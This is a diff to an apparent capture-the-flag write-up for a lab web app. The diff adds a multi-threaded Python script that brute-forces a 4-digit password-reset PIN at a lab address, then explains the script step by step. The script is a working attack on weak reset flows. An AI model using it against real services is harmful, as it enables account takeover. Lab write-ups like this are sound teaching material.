@@ -86,7 +86,87 @@ This would later be used during the password reset process.
 Using the **"Forgot Password?"** mechanism triggered a PIN‑based reset flow.  
 A custom Python script was used to brute‑force the **4‑digit PIN**, allowing the password to be reset.
 
-**After logging in with the newly set password, the first flag was obtained:**
+```python
+import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+url = "http://10.10.51.17:1337/reset_password.php"
+email = "tester@hammer.thm"
+
+# Genereer alle 4-cijferige codes (0000–9999)
+codes = [f"{i:04}" for i in range(10000)]
+
+def check_code(code):
+    data = {"email": email, "code": code}
+    response = requests.post(url, data=data)
+
+    # Hier baseline invullen, bijvoorbeeld een foutmelding
+    if "Invalid code" not in response.text:
+        return code
+    return None
+
+with ThreadPoolExecutor(max_workers=50) as executor:
+    futures = [executor.submit(check_code, code) for code in codes]
+
+    for future in as_completed(futures):
+        result = future.result()
+        if result:
+            print(f"Geldige code gevonden: {result}")
+            executor.shutdown(wait=False)
+            break
+```
+#### 📘 Explanation of the Brute-Force Script
+
+The Python script above automates the process of brute-forcing the 4-digit PIN used in the password-reset mechanism.
+Here’s a breakdown of how it works:
+
+**1. Generating All Possible PIN Codes**
+```python
+codes = [f"{i:04}" for i in range(10000)]
+```
+This generates every possible 4-digit value from 0000 to 9999, formatted with leading zeros.
+Total combinations: 10,000.
+
+**2. Multi-Threaded Execution**
+```python
+with ThreadPoolExecutor(max_workers=50) as executor:
+```
+To speed up the brute-force attack, the script uses 50 concurrent threads, allowing multiple PINs to be tested at the same time.
+This dramatically reduces the time needed from minutes → seconds.
+
+**3. Sending Requests to the Password Reset Endpoint**
+```python
+data = {"email": email, "code": code}
+response = requests.post(url, data=data)
+```
+For each PIN, the script sends a POST request containing:
+- The leaked email address
+- The current PIN being tested
+
+This mimics the normal reset-password request that a user would send through the web interface.
+
+**4. Detecting a Valid PIN**
+```python
+if "Invalid code" not in response.text:
+    return code
+```
+The server responds with the message **"Invalid code"** whenever a PIN is incorrect.
+So, when that message *does not appear*, the PIN is assumed to be correct.
+
+This type of vulnerability is called a **response-based oracle**, where subtle differences in server responses leak information.
+
+**5. Stopping When the Correct Code Is Found**
+```python
+executor.shutdown(wait=False)
+break
+```
+As soon as one thread finds a valid PIN, all other threads are stopped early.
+This prevents unnecessary traffic and speeds up completion.
+
+**🎯 Result**
+
+The script successfully brute-forced the correct 4-digit PIN, allowing the password reset to complete and granting access to the account.
+This ultimately led to the discovery of the first flag.
 ```text
 THM{REDACTED}
 ```
